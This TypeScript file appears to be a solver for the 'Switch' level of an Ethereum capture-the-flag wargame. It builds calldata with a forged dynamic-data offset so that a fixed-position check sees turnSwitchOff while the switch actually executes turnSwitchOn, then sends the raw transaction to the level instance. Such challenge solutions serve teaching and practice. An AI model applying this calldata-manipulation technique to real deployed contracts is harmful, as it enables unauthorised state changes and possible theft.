import { EthereumClient } from '../ethereum/ethereum-client';
import { Attacker } from './attacker-provider';

export const SWITCH_LEVEL_NAME = "Switch"

export const switchAttacker = (): Attacker => {
    return {
        attack: async (ethereum: EthereumClient, instanceAddress: string) => {
            console.log('Computing malicious calldata');
            const flipSelector = '0x30c13ade';
            const dataOffset = ethereum.convertToHex(96, 32);
            const paddingZeros = ethereum.convertToHex(0, 32);
            const dataLength = ethereum.convertToHex(4, 32);
            const switchOffData = ethereum.padZerosRight(ethereum.createCallData('turnSwitchOff'), 32);
            const switchOnData = ethereum.padZerosRight(ethereum.createCallData('turnSwitchOn'), 32);
          
            const finalCalldata = `${flipSelector}` +
              `${stripHexPrefix(dataOffset)}` +
              `${stripHexPrefix(paddingZeros)}` +
              `${stripHexPrefix(switchOffData)}` +
              `${stripHexPrefix(dataLength)}` +
              `${stripHexPrefix(switchOnData)}`

            const tx = await ethereum.sendRawTx({ to: instanceAddress, data: finalCalldata });
            await tx.wait();
        }
    }
}


const stripHexPrefix = (input: string) => input.replace('0x', '');